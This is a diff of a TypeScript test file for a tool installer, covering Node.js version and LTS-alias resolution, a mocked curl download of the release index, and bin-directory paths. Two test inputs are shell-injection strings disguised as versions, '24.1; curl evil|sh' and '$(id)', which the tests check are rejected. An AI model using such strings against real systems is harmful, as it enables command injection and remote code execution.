@@ -6,7 +6,18 @@ import { existsSync, mkdirSync, mkdtempSync, readdirSync, rmSync, writeFileSync 
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { after, test } from "node:test";
-import { INSTALLERS, installTools, nodeArch, pathLine } from "../src/installers.ts";
+import {
+  INSTALLERS,
+  curlNodeIndex,
+  installTools,
+  isValidRequest,
+  nodeArch,
+  pathLine,
+  resolveNodeVersion,
+  resolveVersions,
+  toolBinDirs,
+} from "../src/installers.ts";
+import type { NodeRelease } from "../src/installers.ts";
 
 /** One recorded process call. */
 interface Call {
@@ -134,10 +145,10 @@ test("a failing install becomes a failed result, not a rejection", async () => {
 
 test("pathLine lists bin dirs in tool order with a literal $PATH", () => {
   assert.equal(
-    pathLine({ bun: "1.4.2", node: "24.14.1" }, "/t"),
+    pathLine(toolBinDirs({ bun: "1.4.2", node: "24.14.1" }, "/t")),
     'export PATH="/t/node-24.14.1/bin:/t/bun-1.4.2/node_modules/.bin:$PATH"',
   );
-  assert.equal(pathLine({}, "/t"), "");
+  assert.equal(pathLine([]), "");
 });
 
 test("invalid versions fail without running anything or creating directories", async () => {
@@ -160,7 +171,116 @@ test("the layout refuses a bad version instead of building a path", () => {
   assert.throws(() => INSTALLERS.bun.binDir("/t", "-g"), /invalid version for bun/);
 });
 
-test("pathLine skips invalid versions", () => {
-  assert.equal(pathLine({ node: "24.1; curl evil|sh", bun: "1.4.2" }, "/t"), 'export PATH="/t/bun-1.4.2/node_modules/.bin:$PATH"');
-  assert.equal(pathLine({ node: "$(id)" }, "/t"), "");
+test("toolBinDirs skips invalid versions", () => {
+  assert.deepEqual(toolBinDirs({ node: "24.1; curl evil|sh", bun: "1.4.2" }, "/t"), ["/t/bun-1.4.2/node_modules/.bin"]);
+  assert.deepEqual(toolBinDirs({ node: "$(id)" }, "/t"), []);
+});
+
+/** Fake Node.js release index, newest first like the real one, with one entry out of order. */
+const INDEX: NodeRelease[] = [
+  { version: "v25.1.0", lts: false },
+  { version: "v24.14.1", lts: "Krypton" },
+  { version: "v22.12.0", lts: "Jod" },
+  { version: "v22.1.5", lts: false },
+  { version: "v22.1.0", lts: false },
+  { version: "v20.18.1", lts: "Iron" },
+  { version: "v20.19.0", lts: "Iron" },
+  { version: "v20.3.0", lts: false },
+];
+
+test("resolveNodeVersion picks the newest match for prefixes and aliases", () => {
+  assert.equal(resolveNodeVersion("22", INDEX), "22.12.0");
+  assert.equal(resolveNodeVersion("22.1", INDEX), "22.1.5");
+  assert.equal(resolveNodeVersion("20", INDEX), "20.19.0");
+  assert.equal(resolveNodeVersion("lts/iron", INDEX), "20.19.0");
+  assert.equal(resolveNodeVersion("lts/Jod", INDEX), "22.12.0");
+  assert.equal(resolveNodeVersion("lts/*", INDEX), "24.14.1");
+  assert.equal(resolveNodeVersion("node", INDEX), "25.1.0");
+  assert.equal(resolveNodeVersion("2", INDEX), undefined);
+  assert.equal(resolveNodeVersion("lts/argon", INDEX), undefined);
+});
+
+test("node aliases are accepted for node only", () => {
+  for (const alias of ["lts/iron", "lts/*", "node"]) assert.ok(isValidRequest("node", alias), alias);
+  assert.ok(!isValidRequest("bun", "lts/iron"));
+  assert.ok(!isValidRequest("node", "lts/../x"));
+  assert.ok(!isValidRequest("node", "lts/"));
+  assert.throws(() => INSTALLERS.node.dir("/t", "lts/iron"), /invalid version for node/);
+});
+
+/**
+ * Builds a `Run` that serves a release index to curl's `-o` file and records the calls.
+ *
+ * @param index - Index to write, or undefined to fail like a blocked download.
+ * @returns The recorder and its calls.
+ */
+function indexServer(index: NodeRelease[] | undefined): { calls: Call[]; run: (cmd: string, args: string[], opts?: { env?: NodeJS.ProcessEnv }) => Promise<void> } {
+  const calls: Call[] = [];
+  return {
+    calls,
+    run: async (cmd, args, opts) => {
+      calls.push({ cmd, args, env: opts?.env });
+      if (cmd !== "curl") return;
+      if (!index) throw new Error("curl exited with code 56");
+      writeFileSync(args[args.indexOf("-o") + 1] ?? "", JSON.stringify(index));
+    },
+  };
+}
+
+test("resolveVersions downloads the index with curl argv and resolves a partial node", async () => {
+  const { calls, run } = indexServer(INDEX);
+  const env = { HTTPS_PROXY: "http://proxy:3128" };
+  const { resolved, results } = await resolveVersions({ node: "22", bun: "1.4.2" }, curlNodeIndex(run, env));
+  assert.deepEqual(resolved, { node: "22.12.0", bun: "1.4.2" });
+  assert.deepEqual(results, []);
+  assert.equal(calls.length, 1);
+  assert.equal(calls[0]?.cmd, "curl");
+  assert.equal(calls[0]?.args.at(-1), "https://nodejs.org/dist/index.json");
+  assert.equal(calls[0]?.env, env);
+  const file = calls[0]?.args[(calls[0]?.args.indexOf("-o") ?? 0) + 1] ?? "";
+  assert.equal(existsSync(file), false);
+});
+
+test("resolveVersions skips the download for exact versions", async () => {
+  const { calls, run } = indexServer(INDEX);
+  const { resolved } = await resolveVersions({ node: "24.14.1" }, curlNodeIndex(run, {}));
+  assert.deepEqual(resolved, { node: "24.14.1" });
+  assert.deepEqual(calls, []);
+});
+
+test("an unresolvable node is one failed step and is left out", async () => {
+  for (const [requested, index, error] of [
+    ["lts/argon", INDEX, "no node release matches lts/argon"],
+    ["22", undefined, "curl exited with code 56"],
+  ] as const) {
+    const { run } = indexServer(index);
+    const { resolved, results } = await resolveVersions({ node: requested, pnpm: "9.0.0" }, curlNodeIndex(run, {}));
+    assert.deepEqual(resolved, { pnpm: "9.0.0" });
+    assert.equal(results.length, 1);
+    assert.equal(results[0]?.name, `node ${requested}`);
+    assert.equal(results[0]?.ok, false);
+    assert.equal(results[0]?.error, error);
+  }
+});
+
+test("a resolved partial node installs into node-<exact> and toolBinDirs maps to it", async () => {
+  const dir = toolsDir();
+  const server = indexServer(INDEX);
+  const { resolved } = await resolveVersions({ node: "lts/iron" }, curlNodeIndex(server.run, {}));
+  const { calls, run } = recorder();
+  const results = await installTools(resolved, dir, run, { PATH: "/usr/bin" });
+  assert.equal(results[0]?.name, "node 20.19.0");
+  assert.equal(calls[0]?.args.at(-1), join(dir, "node-20.19.0"));
+  assert.deepEqual(toolBinDirs({ node: "lts/iron" }, dir, resolved), [join(dir, "node-20.19.0", "bin")]);
+  assert.deepEqual(toolBinDirs({ node: "lts/iron" }, dir), []);
+  assert.deepEqual(toolBinDirs({ node: "22" }, dir, { node: "20.19.0" }), [], "a stale resolution is not used");
+});
+
+test("installTools refuses a node version that was not resolved", async () => {
+  const dir = toolsDir();
+  const { calls, run } = recorder();
+  const results = await installTools({ node: "22" }, dir, run, { PATH: "/usr/bin" });
+  assert.deepEqual(calls, []);
+  assert.equal(results[0]?.ok, false);
+  assert.deepEqual(readdirSync(dir), []);
 });
